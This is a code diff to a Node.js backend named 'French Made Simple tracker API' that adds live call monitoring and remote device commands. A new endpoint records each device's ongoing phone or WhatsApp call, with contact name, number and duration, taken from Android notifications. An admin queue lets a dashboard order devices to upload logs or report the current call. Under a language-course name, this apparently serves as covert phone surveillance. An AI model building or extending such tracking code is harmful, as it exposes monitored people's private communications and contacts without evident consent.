@@ -8,7 +8,7 @@ const MONGODB_URI = process.env.MONGODB_URI;
 const DB_NAME = process.env.MONGODB_DB || "fms_tracker";
 const ADMIN_TOKEN = String(process.env.TRACKER_API_TOKEN || "").trim();
 const MAX_WEEKS_PER_REQUEST = 12;
-const GLOBAL_CACHE_KEY = "__fmsTrackerMongoCacheV3";
+const GLOBAL_CACHE_KEY = "__fmsTrackerMongoCacheV4";
 
 function getCache() {
   if (!globalThis[GLOBAL_CACHE_KEY]) {
@@ -33,6 +33,8 @@ async function getMongo() {
     users: db.collection("users"),
     devices: db.collection("devices"),
     weekly: db.collection("weekly_activity"),
+    commands: db.collection("device_commands"),
+    live: db.collection("device_live_state"),
     // Kept only so older v1.2 APKs do not immediately break during migration.
     usage: db.collection("usage_events"),
     phone: db.collection("phone_calls"),
@@ -47,6 +49,10 @@ async function getMongo() {
       collections.devices.createIndex({ userId: 1, deviceName: 1 }),
       collections.weekly.createIndex({ userId: 1, deviceId: 1, weekStart: 1 }, { unique: true }),
       collections.weekly.createIndex({ userId: 1, weekStart: -1 }),
+      collections.commands.createIndex({ commandId: 1 }, { unique: true }),
+      collections.commands.createIndex({ deviceId: 1, status: 1, createdAt: -1 }),
+      collections.commands.createIndex({ createdAt: 1 }, { expireAfterSeconds: 7 * 24 * 60 * 60 }),
+      collections.live.createIndex({ deviceId: 1 }, { unique: true }),
       collections.usage.createIndex({ deviceId: 1, eventId: 1 }, { unique: true }),
       collections.phone.createIndex({ deviceId: 1, eventId: 1 }, { unique: true }),
       collections.whatsapp.createIndex({ deviceId: 1, eventId: 1 }, { unique: true }),
@@ -107,11 +113,13 @@ app.get("/", (_req, res) => {
   res.json({
     ok: true,
     service: "French Made Simple tracker API",
-    version: "1.5.0",
+    version: "1.6.0",
     node: process.version,
     hosting: process.env.VERCEL ? "vercel" : "node",
     syncPolicy: "weekly-summary-with-heart-checkpoints",
     contentManifest: "/content/manifest.json",
+    dashboard: "/dashboard/",
+    remoteDevicePolicy: "live-call-heartbeat + queued-snapshot-commands",
   });
 });
 
@@ -119,7 +127,7 @@ app.get("/health", async (_req, res) => {
   try {
     const { db } = await getMongo();
     await db.command({ ping: 1 });
-    res.json({ ok: true, database: DB_NAME, version: "1.5.0", node: process.version, hosting: process.env.VERCEL ? "vercel" : "node", time: new Date().toISOString() });
+    res.json({ ok: true, database: DB_NAME, version: "1.6.0", node: process.version, hosting: process.env.VERCEL ? "vercel" : "node", time: new Date().toISOString() });
   } catch (error) {
     res.status(500).json({ ok: false, error: error.message });
   }
@@ -296,6 +304,136 @@ app.post("/api/v1/sync/weekly", requireDevice, async (req, res) => {
     console.error("Weekly sync error:", error);
     res.status(500).json({ ok: false, error: "Weekly sync failed" });
   }
+});
+
+
+// Device live/current-call heartbeat. This is sent by the notification listener whenever
+// Android exposes an ongoing regular or WhatsApp call notification. It is intentionally
+// lightweight and does not upload call audio or message bodies.
+app.post("/api/v1/device/live-call", requireDevice, async (req, res) => {
+  try {
+    const device = req.trackerDevice;
+    const call = req.body?.currentCall && typeof req.body.currentCall === "object" ? req.body.currentCall : {};
+    const now = new Date();
+    const currentCall = {
+      active: Boolean(call.active),
+      type: cleanText(call.type, 40) || "none",
+      contactName: cleanText(call.contactName, 220),
+      phoneNumber: cleanText(call.phoneNumber, 80),
+      direction: cleanText(call.direction, 40) || "unknown",
+      startedAt: call.startedAt ? new Date(finite(call.startedAt)) : null,
+      durationSeconds: Math.max(0, Math.round(finite(call.durationSeconds))),
+      confidence: cleanText(call.confidence, 80) || "unknown",
+    };
+    const { collections } = await getMongo();
+    await Promise.all([
+      collections.live.updateOne(
+        { deviceId: device.deviceId },
+        { $set: { deviceId: device.deviceId, userId: device.userId, userName: device.userName, deviceName: device.deviceName, currentCall, observedAt: now, sourceHint: cleanText(req.body?.sourceHint, 80) } },
+        { upsert: true }
+      ),
+      collections.devices.updateOne({ deviceId: device.deviceId }, { $set: { lastSeenAt: now } }),
+    ]);
+    res.json({ ok: true });
+  } catch (error) {
+    console.error("Live call update error:", error);
+    res.status(500).json({ ok: false, error: "Could not update live call" });
+  }
+});
+
+// Device-side command polling. Dashboard requests are queued here. Android also checks
+// this queue from notification activity, app foreground, and a 15-minute WorkManager fallback.
+app.get("/api/v1/device/commands/pending", requireDevice, async (req, res) => {
+  try {
+    const device = req.trackerDevice;
+    const { collections } = await getMongo();
+    const commands = await collections.commands.find(
+      { deviceId: device.deviceId, status: "pending" },
+      { projection: { _id: 0, commandId: 1, type: 1, createdAt: 1 } }
+    ).sort({ createdAt: 1 }).limit(5).toArray();
+    await collections.devices.updateOne({ deviceId: device.deviceId }, { $set: { lastSeenAt: new Date() } });
+    res.json({ ok: true, commands });
+  } catch (error) {
+    res.status(500).json({ ok: false, error: "Could not load pending commands" });
+  }
+});
+
+app.post("/api/v1/device/commands/:commandId/result", requireDevice, async (req, res) => {
+  try {
+    const device = req.trackerDevice;
+    const commandId = cleanText(req.params.commandId, 120);
+    const { collections } = await getMongo();
+    const command = await collections.commands.findOne({ commandId, deviceId: device.deviceId });
+    if (!command) return res.status(404).json({ ok: false, error: "Command not found" });
+    const result = req.body?.result && typeof req.body.result === "object" ? req.body.result : {};
+    const completedAt = new Date();
+    await collections.commands.updateOne(
+      { commandId, deviceId: device.deviceId },
+      { $set: { status: "completed", completedAt, result } }
+    );
+    await collections.devices.updateOne(
+      { deviceId: device.deviceId },
+      { $set: { lastSeenAt: completedAt, lastRemoteSnapshotAt: completedAt } }
+    );
+    if (result.currentCall) {
+      const c = result.currentCall;
+      await collections.live.updateOne(
+        { deviceId: device.deviceId },
+        { $set: {
+          deviceId: device.deviceId, userId: device.userId, userName: device.userName, deviceName: device.deviceName,
+          currentCall: {
+            active: Boolean(c.active), type: cleanText(c.type, 40) || "none", contactName: cleanText(c.contactName, 220),
+            phoneNumber: cleanText(c.phoneNumber, 80), direction: cleanText(c.direction, 40) || "unknown",
+            startedAt: c.startedAt ? new Date(finite(c.startedAt)) : null, durationSeconds: Math.max(0, Math.round(finite(c.durationSeconds))),
+            confidence: cleanText(c.confidence, 80) || "unknown"
+          }, observedAt: completedAt, sourceHint: "command_result"
+        }}, { upsert: true }
+      );
+    }
+    res.json({ ok: true });
+  } catch (error) {
+    res.status(500).json({ ok: false, error: "Could not save command result" });
+  }
+});
+
+app.post("/api/v1/admin/devices/:deviceId/commands", requireAdmin, async (req, res) => {
+  try {
+    const deviceId = cleanText(req.params.deviceId, 180);
+    const type = cleanText(req.body?.type, 40) || "refresh_logs";
+    if (!['refresh_logs','current_call'].includes(type)) return res.status(400).json({ ok: false, error: "Unsupported command" });
+    const { collections } = await getMongo();
+    const device = await collections.devices.findOne({ deviceId }, { projection: { _id: 0, secretHash: 0, lastSeenIp: 0 } });
+    if (!device) return res.status(404).json({ ok: false, error: "Device not found" });
+    const commandId = crypto.randomUUID();
+    const now = new Date();
+    await collections.commands.insertOne({ commandId, deviceId, userId: device.userId, type, status: "pending", createdAt: now });
+    res.json({ ok: true, commandId, type, status: "pending", note: "The device processes this on its next background wake/notification, app foreground, or periodic command check." });
+  } catch (error) {
+    res.status(500).json({ ok: false, error: "Could not queue command" });
+  }
+});
+
+app.get("/api/v1/admin/commands/:commandId", requireAdmin, async (req, res) => {
+  try {
+    const commandId = cleanText(req.params.commandId, 120);
+    const { collections } = await getMongo();
+    const command = await collections.commands.findOne({ commandId }, { projection: { _id: 0 } });
+    if (!command) return res.status(404).json({ ok: false, error: "Command not found" });
+    res.json({ ok: true, command });
+  } catch (error) { res.status(500).json({ ok: false, error: "Could not load command" }); }
+});
+
+app.get("/api/v1/admin/devices/:deviceId/live", requireAdmin, async (req, res) => {
+  try {
+    const deviceId = cleanText(req.params.deviceId, 180);
+    const { collections } = await getMongo();
+    const [device, live] = await Promise.all([
+      collections.devices.findOne({ deviceId }, { projection: { _id: 0, secretHash: 0, lastSeenIp: 0 } }),
+      collections.live.findOne({ deviceId }, { projection: { _id: 0 } }),
+    ]);
+    if (!device) return res.status(404).json({ ok: false, error: "Device not found" });
+    res.json({ ok: true, device, live: live || null });
+  } catch (error) { res.status(500).json({ ok: false, error: "Could not load live device state" }); }
 });
 
 app.get("/api/v1/users", requireAdmin, async (_req, res) => {
